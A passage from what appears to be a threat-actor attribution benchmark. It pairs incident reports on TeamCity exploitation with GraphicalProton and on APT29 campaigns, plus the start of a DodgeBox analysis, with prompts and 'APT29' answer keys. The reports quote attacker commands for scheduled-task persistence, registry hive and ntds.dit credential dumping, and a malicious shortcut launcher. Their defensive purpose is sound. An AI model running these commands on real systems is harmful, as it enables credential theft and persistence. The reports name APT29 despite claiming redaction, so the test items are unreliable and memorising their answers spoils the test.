main indicators of interest: the URL 'hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll' and the file 'AclNumsInvertHost.dll.' We then analyzed the URL referenced for downloading this payload. At the time of the incident, there was limited open-source information on the IP contained in the URL or associated URLs. However, the certificate used on the webserver hosted at this IP was of interest. The certificate is expired with the common name '*.ultasrv[.]com'. This common name does not appear to be associated with a legitimate organization[8]. The entity associated with ultasrv[.]com seems to be a VPS (Virtual Private Server) provider. Looking more closely at the webserver itself, we identified that it had an accessible open directory service. We then used this access to identify additional payloads hosted by the associated threat actor. The files on the server can be seen in Figure 7.\nFigure 7: Files from the opendir listing of the C2 server used by the threat actor associated with TeamCity exploitation.\nSome information on the hosted files is provided in Table 2, along with associated file hashes. \nAnalysis of the code in the poc.py file identified the script as a custom Python implementation of an exploit for the TeamCity vulnerability CVE-2023-42793. You can see the request URL found in the log and the Python code used to generate the request in Figure 8.\nFigure 8: A snippet of code from poc.py found on the C2 web server, and a snippet of the TeamCity log showing a similar request received by the victim during exploitation.\nComparing the structure of a request sent using this script and the commands executed from the victim logs, it is almost certain that this script was used to deliver the exploit to the victim TeamCity server (HOST_1_TEAMCITY ). This links the IP extracted from the scheduled task (103[.]76[.]128[.]34) to the source of the exploitation from the logs shown in Figure 9 (45[.]138[.]16[.]63). Using the FortiGuard Central Threat System (CTS), we could also see that the IP address associated with the exploitation has been linked to other significant malicious activity. Of the 171 domains associated with this IP, 92 have been tagged with high confidence as malicious, and 78 have been tagged with high confidence as suspicious. Only one of the domains has been tagged as low risk (Figure 9).\nFigure 9: FortiGuard CTS information on the IP associated with the main threat actor TeamCity exploitation in the victim environment.\nThe other element of interest in the scheduled task created by the main threat actor was the DLL file, 'AclNumsInvertHost.dll.' Our analysis identified that the DLL AclNumsInvertHost.dll has ten file sections. The most notable was '.fy55f5', which is a user-modified section. This section has an MZ header (indicating it is a Windows portable executable), but the remainder of the code has a high entropy of 7.99, which is typically indicative of encryption. The '.fy55f5' section can be seen in Figure 10.\n\nFigure 10: Encrypted code section of the AclNumsInvertHost.dll executed as part of the main threat actor's scheduled task persistence.\nThe IR team believes that this '.fy55f5' section of the DLL contains the final payload, which is decrypted at runtime. There are a number of anti-debug techniques implemented within the DLL file code that inhibited dynamic analysis during the engagement. To understand the DLL functionality more quickly, we performed comprehensive Yara scanning of all the files pulled from the threat actors' webserver. The AclNumsInvertHost.dll library and multiple other DLL files matched on a Yara rule for a known malware family called 'GraphicalProton.' The positive Yara rule match was developed by Insikt Group from Recorded Future and is based on a specific API calling method employed by previously observed GraphicalProton samples. A match for this rule is a high-confidence indicator of GraphicalProton. The results of the matching Yara scan are shown in Figure 11.\n\nFigure 11: Yara rule for GraphicalProton matched against multiple DLL files found on the main threat actor opendir server.\nThe files in Figure 11 also matched the Yara rule M_Dropper_BURNTBATTER_1, which searches for the custom chaskey implementation. This Yara rule was from the article, 'Backchannel Diplomacy: APT29's Rapidly Evolving Diplomatic Phishing Operations,' by Mandiant[9].\nGraphicalProton is a malware historically employed by group APT29. While this tooling is confidently linked to APT29 (Mandiant) or BlueBravo (Recorded Future), the victimology and initial access vector employed by the main threat actor throughout earlier stages of this intrusion does not align with currently reported APT29 campaigns. However, a previous well-known attack from APT29 targeted the company Solarwinds, using the same build of the TeamCity management tool[10]. While the IR team could not attribute this activity to APT29 with high confidence, associated threat intelligence was used to focus our investigation further.[11]\nAt this stage of the intrusion, FortiEDR detected and blocked this scheduled task from executing due to its suspicious use of rundll32.exe and a machine learning assessment of the previously unobserved DLL 'AclNumsInvertHost.dll.' This forced the main threat actor to attempt alternative methods of execution.\nThe first alternative method was to use the TeamCity exploit on HOST_1_TEAMCITY to download the 'iisexpresstray.exe' and 'mscoree.dll' files from the same C2 through PowerShell. These two files were written to the directory' C:\\Windows\\WinStore\\'. The 'iisexpress.exe' file is a legitimate signed installer executable for IISExpress, a lightweight implementation of IIS provided by Microsoft[12]. However, downloaded alongside this legitimate installer was 'mscoree.dll,' a malicious DLL file with the same name as a legitimate DLL (T1036.005).[13] The combination of these two files would allow the threat actor to employ DLL search order hijacking (T1574.001)[14] to execute their malicious DLL when the legitimate IISExpress executable is executed.\nTo execute this side-loading attack, the main threat actor created another scheduled task using the following command executed via the TeamCity exploit:\nschtasks.exe /create /SC ONSTART /tn\n\"\\Microsoft\\Windows\\IISUpdateService\" /tr\n\"C:\\Windows\\WinStore\\iisexpresstray.exe\" /RU \"SYSTEM\" /f\nAfter the scheduled task was created, the threat actor executed the scheduled task using the following command:\nschtasks.exe /run /tn \"\\Microsoft\\Windows\\IISUpdateService\"\nWhen the 'iisexpresstray.exe' file was executed on the HOST_1_TEAMCITY, a separate thread was created by the malicious DLL file that tried to access the system credentials through lsass.exe. This attempt was also blocked by FortiEDR. This is shown in the event graph in Figure 12.\nFigure 12: FortiEDR blocked access to lsass.exe from iisexpresstray.exe.\nThe main threat actor had used multiple legitimate software in this attack. The list of legitimate files is shown in the table below. Some of the executables listed in Table 3 were recovered from the opendir[15] web server.\n  \nSince FortiEDR blocked the execution of this second malicious DLL file, the main threat actor changed their approach and attempted to dump the registry using Windows utility reg.exe directly through further TeamCity exploitation. Unfortunately for the main threat actor, FortiEDR blocked this execution due to the triggered rules 'Access to Critical System Information' and 'Connection Attempt from a Hidden Process' under its 'Exfiltration Prevention' security policy. A screenshot of the related FortiEDR event is shown in Figure 13.\nFigure 13: Attempt to dump system credentials using reg.exe was blocked by FortiEDR.\nThese attempts represent only two of the many credential dumping techniques the threat actor attempted to employ within the victim environment. Fortunately, the FortiEDR software installed on the majority of their endpoints, including the victim server, blocked these techniques. The associated EDR security events also generated multiple alerts. Unfortunately, the targeted organization made numerous broad exceptions for this malicious behavior. This was likely due to the behavior originating from the TeamCity application, so they were incorrectly assessed as a false positive. These exceptions are outlined below:\n1.\tallow rundll32.exe to run AclNumsInverHost.dll when rundll32.exe is executed by cmd.exe.\n2.\tallow reg.exe to run as a hidden process\n3.\tallow reg.exe to access critical system information (credential dumping)\n4.\tallow natid.sys to be loaded (a suspicious driver dropped by the threat actor)\n5.\tallow rundll32.exe to execute AclNumsInvertHost.dll and create a thread in any lsass.exe process\n6.\tallow rundll32.exe to execute AclNumsInvertHost.dll and create a thread in any svchost.exe process\n7.\tallow any execution of PowerShell and associated rule violations\nThese exceptions removed the constraints around the adversary's ability to fully employ their TeamCity exploitation, allowing the main threat actor to continue their execution unrestricted by FortiEDR.\nAfter these exceptions were set, the main threat actor was able to successfully dump the registry of the Windows host HOST_1_TEAMCITY to gain access to local user credentials (T1003.002)[16]. To achieve this, the threat actor used reg.exe to dump the SYSTEM registry hive (T1003.002[17]) using the command below:\nreg.exe save HKLM\\SYSTEM “C:\\Windows\\temp\\1\\sy.sa” /y\nThis can be seen in the FortiEDR Threat Hunting event shown in Figure 14.\nFigure 14: FortiEDR Threat Hunting event associated with the reg.exe process being used to dump the SYSTEM registry hive.\nAt this stage, the main threat actor continued to employ their TeamCity exploit for execution, trying alternative techniques to establish a more robust foothold on the HOST_1_TEAMCITY. They used their access to create a Windows account, 'oldadministrator' (T1136.001[18]), added the newly created account to the local administrators group, and made the account a special account by adding it to the registry path 'NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist' with the DWORD value 0. When a Windows user account is added to this registry location with value 0, the account is not shown on the Windows GUI login screen. This was likely done to hide their new access and ensure persistence from direct observation by normal system users. However, the IR team did not observe that the main actor ever used this newly created 'oldadministrator' account. Log events associated with these activities can be observed in the teamcity-server.log snippet shown in Figure 15.\n\nFigure 15: Extract from the TeamCity application logs showing the commands used to create a new local Windows user on the victim endpoint.\nAt this time, the host HOST_1_TEAMCITY was patched for CVE-2023-42793. The IR team verified the patch was successful and that there was no further exploitation of this vulnerability on this host following the installation of the patch. Unfortunately, the threat actor had already created alternative access through their GraphicalProton implant and had already begun laterally moving to other hosts within the victim network through SMB, RDP, and remote WMIC commands.\nThe hosts HOST_3_SVR and HOST_4_SVR were targeted using WMIC commands (T1047)[19] from the original compromised host, HOST_1_TEAMCITY. The network connections linked to this behavior were established using explicit credentials. This indicates that the main threat actor had successfully pulled credentials prior to this activity. The IR team thinks this WMIC activity was likely conducted to execute a GraphicalProton DLL through either rundll32 proxy execution like that demonstrated in the previously discussed scheduled task or through search order hijacking using one of the binary and DLL pairs pulled from the main threat actor C2 opendir web server. You can see evidence of the network connection associated with this WMIC activity from the Windows event log in Figure 16.\nFigure 16: Windows log screenshot showing WMIC.exe execution remotely from HOST_1_TEAMCITY to HOST_4_SVR\nOn the HOST_2_SVR, the main threat actor employed a different lateral movement technique by establishing an RDP connection from the HOST_1_TEAMCITY. This connection was used to create multiple suspicious files in the 'C:\\Windows\\SchCache’ directory on HOST_2_SVR. Two DLL files (‘oleacc.dll’ and ‘oleac.dll’) and one executable file (‘FlashUtil_ActiveX.exe’) were created in this directory. When the IR team ran a Yara scan against these files, the DLL file oleac.dll matched the Yara rule for GraphicalProton. The remaining files, oleacc.dll and FlashUtil_ActiveX.exe, were determined to be non-malicious Microsoft-signed files.\nThe main threat actor then created persistence for this file through a scheduled task. This time, the task was named 'WindowsActiveX' and was created to execute the 'C:\\Windows\\SchCache\\FlashUtil_ActiveX.exe' file when Windows starts. This shows the use of another legitimate executable to perform search order hijacking to load a malicious GraphicalProton DLL. The command used to create this scheduled task can be observed in the FortiEDR Threat Hunting event, shown in Figure 17.\n\nFigure 17: FortiEDR Threat Hunting event showing the creation of a scheduled task for FlashUtil_ActiveX.exe\nIn another credential dumping attempt, the main threat actor tried to dump active directory credentials using the Windows utility ‘ntdsutil.exe’ on the host HOST_2_SVR. They tried to dump credentials using the following command:\nntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\tempp' q q\nThis command aims to dump the ntds.dit file, the SYSTEM registry hive, and the SECURITY registry hives in the given path (in this case, ‘C:\\tempp’). Threat actors can often dump password hashes from these files offline using tools like mimikatz.[20] FortiEDR blocked this activity, and the associated security event can be observed in Figure 18.\nFigure 18: Execution of ntdsutil.exe to dump ntds.dit file was blocked by FortiEDR.\nIn addition to this scheduled task, the IR team found another GraphicalProton DLL in the ‘C:\\Program Files\\Windows Defender’ directory. This directory contained an executable PE file, ‘MpCmdRun.exe,’ and DLL files, ‘MpCmdHelp.dll’ and ‘MpClient.dll.’ One of the files (MpCmdHelp.dll) matched against the Yara rule for malware GraphicalProton, and the second DLL file, MpClient.dll, is a legitimate library used by ‘MpCmdRun.exe.’ Like the ‘FlashUtil_ActiveX.exe’ example discussed earlier in this report, the ‘MpCmdRun.exe’ is a legitimate binary vulnerable to search order hijacking. The ‘MpCmdRun.exe’ binary is an official command-line tool used to perform various operations related to Microsoft Defender Antivirus. The default path of this binary is ‘C:\\Program Files\\Windows Defender.’\nAt this investigation stage, the team performed large-scale Yara scanning to identify additional potentially compromised hosts. This scanning identified DLL files matching the GraphicalProton signature written to disk on the hosts HOST_6_SQL and HOST_7_SVR. On both hosts, a task named ‘WindowsDefenderService’ that executed the GraphicalProton DLLs was created, matching the tradecraft of the previously discussed scheduled tasks. One of the scheduled task files associated with these tasks can be seen in Figure 19.\nFigure 19: Schedule task file for proxy execution of the malicious GraphicalProton DLL file identified on HOST_6_SQL.\nThe IR team also found a network login to HOST_5_SVR from the primary infected HOST_1_TEAMCITY host.\nShortly after this login event, an instance of rundll32 used for proxy execution of another GraphicalProton sample was started. However, the process crashed. This resulted in a memory dump of the rundll32.exe process. The IR team performed strings analysis of the memory dump and found URLs of graph.microsoft[.]com and 1drv[.]ms, which are legitimate domains related to Microsoft OneDrive operations. The IR team also found an email address (quentparoty[@]outlook.com) in the memory dump, although this indicator has not been linked to any known IOCs. However, it has been included for completeness. Significant strings extracted from the memory dump can be seen in Figure 20.\nFigure 20: Strings from memory analysis of crash dump showing email address and URL of OneDrive.\nSimilar network indicators were identified when we executed the AclNumsInvertHost.dll file using rundll32.exe in a virtual analysis environment. The IR team also observed connections to api.dropboxapi[.]com from the rundll32.exe in the Threat Hunting data of the victim environment. The GraphicalProton report[21] from Insikt Group from Recorded Future showed that researchers had previously observed GraphicalProton samples employ Microsoft OneDrive and Dropbox as part of their C2.\nThe malicious DLL samples were shared with analysts from the FortiGuard Forensics Team for further malware analysis. They confirmed that the behavior of the multiple malicious DLL matches GraphicalProton malware behavior. The malicious DLL was communicating with Microsoft OneDrive, and the following information was obtained in JSON format from this communication. \nThe analyst team also observed numerous anti-debugging techniques in malicious DLL files, such as a call to NtQueryObject to look for the “DebugObject” variable. It also has strings such as “Ollydbg,” probably to check if the Ollydbg.exe process is running. If the process is found running, the malware may then terminate itself.\nGiven our understanding of the main threat actor’s operations, we determined that persistence was still possible. The IR team provided recommendations on removing existing adversary accesses and persistence. A high-level view of the containment and eradication actions recommended are provided below:\n1.\tBlocking the IP addresses used by threat actors\n2.\tRemoving TeamCity software accounts created by threat actors\n3.\tRemoving Windows accounts created by threat actors\n4.\tRemoving backdoors created by threat actors\n5.\tRemoving malicious files dropped by threat actors\nAfter implementing these containment and remediation actions by the victim security team, no further malicious activity has been observed.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "APT29"
    },
    {
        "url": "https://explore.avertium.com/resource/evolution-of-russian-apt29-new-attacks-and-techniques-uncovered",
        "Text": "EXECUTIVE SUMMARY\nIn December 2020, the Texas-based IT management and monitoring platform company, SolarWinds, was compromised by the nation-state threat actor APT29 (also known as Nobelium, Cozy Bear, and Midnight Blizzard). The group managed to compromise the company by slipping a malicious code into Orion, a software program that monitors various components within the company's network, while it was being updated. The threat actors then used that update to deploy a massive cyberattack against the U.S.\nWhen it comes to exceptionally sophisticated malware attacks, APT29 stands at the forefront. The SolarWinds breach marked only the beginning of persistent malware attacks carried out by the threat actor. Since the attack on SolarWinds, the APT has relentlessly persisted in its attacks on governments, defense entities, critical manufacturing organizations, and IT service providers. Their latest attacks involve exploiting lesser-known Windows features and specifically targeting diplomats stationed in Ukraine. Let’s examine APT29, their recent attacks, and what organizations can do to protect themselves. \n \nTIR SNAPSHOTS\n•\tOver the years, the Russian nation-state threat actor APT29 has led the way in highly sophisticated malware attacks and the SolarWinds breach was just the beginning of their persistence. \n•\tIn August 2021, APT29 attempted to exploit a cluster of Exchange vulnerabilities known as ProxyShell (CVE-2021-31207, CVE-2021-34523, CVE-2021-34473). \n•\tIn October 2021, Microsoft issued a warning about APT29's renewed attacks on global IT supply-chains. This campaign initially surfaced in May 2021 and has resulted in 14 confirmed compromise cases, targeting 140 companies. \n•\tAPT29 was observed relying on various techniques, including password spray, API abuse, phishing, and token theft, to gain credentials and privileged access to victims' systems. \n•\tIn 2022, APT29, was linked to another \"highly targeted\" post-exploitation malware capable of maintaining persistent access to compromised environments. Dubbed MagicWeb by Microsoft's threat intelligence teams, this development reiterated APT29's commitment to developing and maintaining purpose-built capabilities. \n•\tIn 2022, the nation-state actor APT29 was discovered utilizing a lesser-known Windows feature called Credential Roaming. This exploit came to light after a successful phishing attack on an unspecified European diplomatic entity. \n•\tAPT29's April 2023 espionage campaign targeted NATO and EU member states' diplomatic and foreign ministries using previously undocumented malware. Poland's Military Counterintelligence Service and CERT Polska (CERT.PL) discovered the campaign, which involved APT29 sending spear phishing emails to specific personnel at diplomatic posts.\n\n \nAPT29'S BACKGROUND\n2021\nOver the years, the Russian nation-state threat actor APT29 has led the way in highly sophisticated malware attacks and the SolarWinds breach was just the beginning of their persistence. In August 2021, APT29 attempted to exploit a cluster of Exchange vulnerabilities known as ProxyShell (CVE-2021-31207, CVE-2021-34523, CVE-2021-34473). This vulnerability allowed threat actors to deploy web shells on unpatched Exchange servers for later access. Despite the availability of security patches, organizations remained vulnerable due to their failure to update their servers.\nBy 2021, APT29 shifted its focus to targeting software and cloud service resellers. Those attacks impacted 3,000 individual accounts across more than 150 organizations. Employing an established pattern of unique infrastructure and tools for each target, they enhanced their ability to evade detection for an extended period.\nAPT29 breached SolarWinds using the SUNBURST backdoor, TEARDROP malware, and GoldMax malware for their supply chain attack. They also breached nine U.S. government agencies (Department of Homeland Security, CISA, US Treasury, etc.) and 100 private companies with the same malware. After gaining access, APT29 employed a simple yet sophisticated strategy to delve deeper into their victims' networks, positioning themselves to compromise Microsoft 365 and Azure.\nAlso, APT29 covertly integrated software backdoors into network-management programs distributed by SolarWinds, enabling spying activities. The attackers also introduced new Azure identities and elevated permissions for existing identities, manipulating Microsoft programs to facilitate email theft. As a result of their success, APT29 managed to infiltrate the Cybersecurity and Infrastructure Security Agency (CISA), a government organization tasked with protecting federal computer networks from attacks. This access allowed APT29 to steal, alter, and potentially destroy data. After gaining entry, APT29 meticulously erased all traces of their presence, complicating the efforts of investigators to attribute the breach to them.\nIn October 2021, Microsoft issued a warning about APT29's renewed attacks on global IT supply chains. This campaign initially surfaced in May 2021 and has resulted in 14 confirmed compromise cases, targeting 140 companies. During this time, APT29 was observed relying on various techniques, including password spray, API abuse, phishing, and token theft, to gain credentials and privileged access to victims' systems. Microsoft believes that APT29 employed a remote access malware known as FoggyWeb to establish persistence on compromised Active Directory Federation Services servers (AD FS). This backdoor persistence was first detected in the wild in April 2021.\n\n2022\nMagicWeb\nIn 2022, APT29, was linked to another \"highly targeted\" post-exploitation malware capable of maintaining persistent access to compromised environments. Dubbed MagicWeb by Microsoft's threat intelligence teams, this development reiterated APT29's commitment to developing and maintaining purpose-built capabilities.\nMagicWeb, sharing similarities with another tool called FoggyWeb, was assessed to have been deployed to maintain access and block eviction during remediation efforts, but only after obtaining highly privileged access to an environment and moving laterally to an AD FS server. While FoggyWeb came with specialized capabilities to deliver additional payloads and steal sensitive information from Active Directory Federation Services (AD FS) servers, MagicWeb was a rogue DLL (a backdoored version of \"Microsoft.IdentityServer.Diagnostics.dll\") that facilitated covert access to an AD FS system through an authentication bypass.\nThe findings came on the heels of the disclosure of an APT29-led campaign aimed at NATO-affiliated organizations with the goal of accessing foreign policy information. Specifically, this involved disabling an enterprise logging feature called Purview Audit (previously Advanced Audit) to harvest emails from Microsoft 365 accounts. Another newer tactic used by the actor during that time was the use of a password guessing attack to obtain the credentials associated with a dormant account and enroll it for multi-factor authentication (MFA), granting it access to the organization's VPN infrastructure. \n\nAlso, in 2022, the nation-state actor APT29 was discovered utilizing a lesser-known Windows feature called Credential Roaming. This exploit came to light after a successful phishing attack on an unspecified European diplomatic entity. Mandiant identified the use of Credential Roaming by the threat actor during their presence inside the victim network in early 2022. At that time, APT29 executed \"numerous LDAP queries with unusual properties\" against the Active Directory system.\nCredential Roaming is a feature introduced in Windows Server 2003 Service Pack 1 (SP1) that enables users to securely access their credentials, such as private keys and certificates, across various workstations within a Windows domain. Microsoft explains that Credential Roaming stores user credentials in two attributes: ms-PKI-DPAPIMasterKeys and ms-PKI AccountCredentials. The latter is a multi-valued LDAP property containing encrypted credential objects in binary large objects (BLOBs).\nMandiant discovered an arbitrary file write vulnerability that could allow a threat actor to achieve remote code execution in the context of the logged-in victim. Tracked as CVE-2022-30170 (CVSS score 7.3), Microsoft addressed this issue as part of the September 13, 2022 Patch Tuesday updates. The company stated that exploiting the vulnerability requires a user to log in to Windows.\nIf successfully exploited, APT29 could have gained remote interactive logon rights to a victim's machine, which the victim's account would not normally have. Mandiant's research sheds light on why APT29 actively queries the related LDAP attributes in Active Directory.\n \n \nRECENT ATTACKS\nPolish Government\n\nIn April 2023, APT29 executed an espionage campaign directed at diplomatic and foreign ministries of NATO and EU member states. This ongoing operation utilized previously undocumented malware payloads. The campaign, discovered and investigated by Poland's Military Counterintelligence Service and CERT Polska (CERT.PL), involved APT29 hackers sending spear-phishing emails to specific personnel at diplomatic posts.\nThese emails were disguised as messages from European embassies, inviting recipients to meetings or collaboration on documents. The emails contained PDF attachments with links to seemingly external calendars, meeting details, or work files. Clicking on the links led to web pages that used JavaScript code to decode a payload, offering it for download. The script used HTML Smuggling, facilitating the transfer of files with .ISO, .ZIP, or .IMG attachments.\n \nAPT29 has employed .ISO files for malware distribution previously, but they have now introduced a new technique using .IMG (disk image) files. When these files are opened in Windows, they are automatically mounted as a virtual disk, allowing users to access the files within. In this case, the files were Windows shortcuts (LNK) that triggered a legitimate executable, which then loaded a malicious DLL.\nThis technique is referred to as DLL sideloading, where attackers deliver an executable file from a genuine application known to load a DLL library with a specific name from the same directory. The attackers simply provide a malicious DLL with the same name to accompany the file. By utilizing a legitimate file to load malicious code into memory, the attackers aim to evade detection by security tools that may have the file whitelisted.\nThe attack's initial payload, referred to as SNOWYAMBER by Polish researchers, is a lightweight custom malware dropper that gathers basic computer information and communicates with a command-and-control server on Notion.so, an online workspace collaboration service. The primary objective of this dropper is to download and execute additional malware, including Cobalt Strike and BruteRatel beacons, which are commercial post-exploitation frameworks initially intended for penetration testers but have been adopted by attackers as well.\nAlthough a variant of SNOWYAMBER was publicly reported by Recorder Future in October 2022, the Polish researchers discovered a new variant with enhanced anti-detection routines in February 2023. APT29 also utilized another payload named HALFRIG, which, unlike SNOWYAMBER, decrypted Cobalt Strike from shellcode instead of relying on a command-and-control server for the download.\nIn March the hackers employed another tool named QUARTERRIG, sharing a portion of its codebase with HALFRIG. At this time, APT29’s list of targets included diplomatic entities (embassies, diplomatic staff, foreign ministries, etc.), government entities, international organizations, and non-governmental organizations. Although the attacks were primarily focused on EU and NATO entities, some targets were located in Africa. \n \nDiplomats Stationed in Ukraine\nBy June 2023, APT29 initiated a targeted campaign aiming to breach the computers of numerous diplomats stationed at embassies in Ukraine. Palo Alto Networks' Unit 42 research division revealed that this extensive espionage activity focused on diplomats from at least 22 of the approximately 80 foreign missions in Kyiv, the capital of Ukraine.\nIn mid-April 2023, a diplomat within the Polish Ministry of Foreign Affairs sent out a legitimate flyer to various embassies advertising the sale of a used BMW 5-series sedan located in Kyiv. APT29 intercepted and duplicated the flyer, embedding it with malicious software, and distributed it to dozens of other foreign diplomats working in Kyiv.\nThe Polish diplomat said he had sent the original advertisement to various embassies in Kyiv, and that someone had called him back because the price looked \"attractive\". However, he realized that the price the individual was referring to appeared to be slightly lower. It turns out, the threat actor listed the diplomat's BMW for a lower price - 7,500 euros - in their fake version of the advertisement, to encourage more people to download malicious software that would give them remote access to their devices. \nThat software was disguised as an album of photographs of the used BMW. Attempts to open those photographs would have infected the target's machine. Twenty-one of the 22 embassies were targeted by the threat actors, but it’s not clear which embassies (if any) were compromised. \nIn 2021, U.S. and British intelligence agencies linked APT29 to Russia's foreign Intelligence Service, the SVR. Researchers at Unit 42 traced the fake car advertisement campaign back to the SVR, as the threat actors reused specific tools and techniques previously associated with the spy agency. \n \n \nA NEW CAMPAIGN?\nIn May 2023, the researchers at Lab52 published their findings on a new campaign by an unknown threat actor using similar techniques to APT29, leading them to believe the new activity is from APT29. They named the campaign “Information” and stated that there was a new sample resembling QUARTERRIG, a malware previously analyzed by CERT.PL and connected to APT29, that was uploaded to VirusTotal. The analysis of the QUARTERRIG campaign referred to it as \"Note\". However, Lab52 has named the campaign “Information” so they can show the new features of the campaign. \nThe hash of the sample publicly available on VirusTotal is b422ba73f389ae5ef9411cf4484c840c7c82f2731c6324db0b24b6f87ce8477d and only 3 antivirus engines identified the sample as malicious at the time of Lab52’s findings. Lab52 reports that the new campaign exhibits a structure highly resembling the “Note” campaigns outlined in the CERT.PL report that we mentioned previously. The samples studied in the CERT.PL report date back to March 2023. However, Lab52 has observed a shift in the malware's operation since April 2023, noting variations in the injection method within the latest analyzed samples.\nThis time, the shellcode is found in a file named \"dbg.info,\" which differs from what was observed in previous campaigns. The \"Information.iso\" includes the following components:\n•\tAppvlsSubsystems64.dll – A DLL utilized to load a genuine system DLL and inject the shellcode into it.\n•\tdbg.info – Contains the shellcode.\n•\tInformation.exe – A legitimate binary signed by Microsoft, intended to load AppvlsSubsystems64.dll via DLL Side-Load.\nLab52 also stated that the compilation date of AppvIsvSubsystems64.dll in this new campaign is more recent than in the previous one, indicating possible modifications made to improve the sample. The firm also stated that the most noticeable change between previous campaigns and the new one is the injection technique. \nThe objective remains unchanged: executing two DLLs using the executable (Information.exe). The first DLL, AppvlsvSubsystems64.dll, will be loaded during the process's execution. The second DLL will be loaded by AppvlsvSubsystem64.dll, but in this case, it will undergo careful modifications using different techniques to minimize detection methods.\nThus, Information.exe, a legitimate binary, will serve as the container for the malware to execute. To achieve this, it will load AppvIsvSubsystems64.dll, which will identify a suitable system DLL to be modified with the shellcode before loading into Information.exe. The main changes are found in AppvIsvSubsystems64.dll. Additionally, the command and control (C2) vary. Similar to how QUARTERRIG evolved from HALFRIG, APT29 has enhanced the sophistication of its dll loader \"Applvsubsystem64.dll\" in this new campaign. \n \nCCleaner\nAs of July 2023, Lab52 has reported the discovery of more advanced tactics used by APT29, which includes the usage of SVG Dropper, DLL for infection, and C2 behavior. The observed campaign's primary method of entry is through a phishing email with the subject \"Invitation - Santa Lucia Celebration.\" This deceptive invitation is designed to impersonate the Norwegian embassy.\n \n \nAfter opening the file, an executed script initiates the process of mounting and downloading a file with a .iso extension, which holds the next stage of infection. This process transforms the .svg file into an HTML Smuggling technique, effectively infecting the victim, and dropping the next stage of the malware. Next, a download of an ISO file named \"invitation.iso\" is triggered, containing content similar to what Lab52 has previously observed in other APT29 campaigns.\nThe attention-grabbing file is invitation.lnk, a deceptive shortcut with a folder icon that executes the following command:\n\n%windir%/system32/cmd.exe /q /c \"robocopy . C:\\Windows\\Tasks /NODCOPY /NFL /NDL /NJH /NJS /NC /NS /NP > nul & start C:\\Windows\\Tasks\\CCleanerReactivator.exe > nul\"\nUsing Robocopy, all files are copied to the \"C:\\Windows\\Tasks\" folder, before CCleanerReactivator.exe is executed. CCleanerReactivator.exe is a digitally signed binary and remains undetected in VirusTotal. This software serves the legitimate purpose of freeing up computer space and can be downloaded legally.\nRegarding C2 communications, Lab52 reported significant changes compared to previous campaigns. In the past, registration with C2 involved a POST request of an encrypted JSON containing the UserName and ComputerName. However, in this latest version, victim IDs in C2 have been streamlined to just 4 digits. Furthermore, the next stage (shellcode) is directly downloaded from C2 instead of being loaded locally.\n\nIt's important for cyber security professionals to pay close attention to established APTs just as much as they focus on newer ones. The example of APT29's espionage campaign in April 2023 targeting diplomatic and foreign ministries of NATO and EU member states demonstrates that even well-established threat actors can evolve their tactics and develop previously undocumented malware payloads. \n\nBy closely monitoring and analyzing the activities of known APT groups, security professionals can gain valuable insights into their methods, enabling better preparedness and proactive defense measures against their future attacks. Ignoring or underestimating established APTs could leave organizations vulnerable to highly sophisticated and evolving threats, potentially leading to significant data breaches, and compromising national security or sensitive information. A comprehensive approach to cybersecurity should include vigilant monitoring of both well-known and emerging threat actors to safeguard against constantly evolving cyber threats. \nAVERTIUM'S RECOMMENDATIONS\n•\tEmployee Training and Awareness: Conduct regular cybersecurity training sessions for employees to educate them about the dangers of phishing campaigns. Teach them how to identify suspicious emails, links, and attachments. Encourage a culture of reporting potential phishing attempts to the IT or security team.\n•\tRobust Email Filtering: Implement advanced email filtering solutions that can detect and block phishing emails before they reach employees' inboxes. These filters can analyze email content, attachments, and sender reputation to identify and quarantine potentially malicious messages.\n•\tMulti-Factor Authentication (MFA): Enforce the use of multi-factor authentication for accessing sensitive accounts and systems. MFA adds an extra layer of security by requiring users to provide a second form of verification (e.g., a one-time code sent to their mobile device) in addition to their password.\n•\tRegular Security Patching and Updates: Ensure all software, operating systems, and security applications are up to date with the latest patches and updates. Cybercriminals often exploit known vulnerabilities in outdated software to launch phishing attacks. Regular updates help mitigate these risks and enhance overall cybersecurity posture.\n \n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "APT29"
    },
    {
        "url": "https://www.zscaler.com/blogs/security-research/dodgebox-deep-dive-updated-arsenal-apt41-part-1",
        "Text": "Introduction\nIn April 2024, Zscaler ThreatLabz uncovered a previously unknown loader called DodgeBox. Upon further analysis, striking similarities were found between DodgeBox and variants of StealthVector, a tool associated with the China-based advanced persistent threat (APT) actor APT41 / Earth Baku. DodgeBox is a loader that proceeds to load a new backdoor named MoonWalk. MoonWalk shares many evasion techniques implemented in DodgeBox and utilizes Google Drive for command-and-control (C2) communication.\nThis two-part blog series aims to provide detailed technical analysis of both the DodgeBox loader and the MoonWalk backdoor. The goal is to assist blue teams in comprehending this emerging threat and offer insights into our attribution of the threat. Part 1 will offer an in-depth examination of the DodgeBox loader, highlighting its distinct characteristics and resemblances to StealthVector while Part 2 will delve into the intricacies of the MoonWalk backdoor.\nTechnical Analysis\nAttack chain\nAPT41 employs DLL sideloading as a means of executing DodgeBox. They utilize a legitimate executable (taskhost.exe), signed by Sandboxie, to sideload a malicious DLL (sbiedll.dll). This malicious DLL, DodgeBox, serves as a loader and is responsible for decrypting a second stage payload from an encrypted DAT file (sbiedll.dat). The decrypted payload, MoonWalk functions as a backdoor that abuses Google Drive for command-and-control (C2) communication. The figure below illustrates the attack chain at a high level.\n\nFigure 1: Attack chain used to deploy the DodgeBox loader and MoonWalk backdoor.\nDodgeBox analysis\nDodgeBox, a reflective DLL loader written in C, showcases similarities to StealthVector in terms of concept but incorporates significant improvements in its implementation. It offers various capabilities, including decrypting and loading embedded DLLs, conducting environment checks and bindings, and executing cleanup procedures. What sets DodgeBox apart from other malware is its unique algorithms and techniques.\nDuring our threat hunting activities, we came across two DodgeBox samples that were designed to be sideloaded by signed legitimate executables. One of these executables was developed by 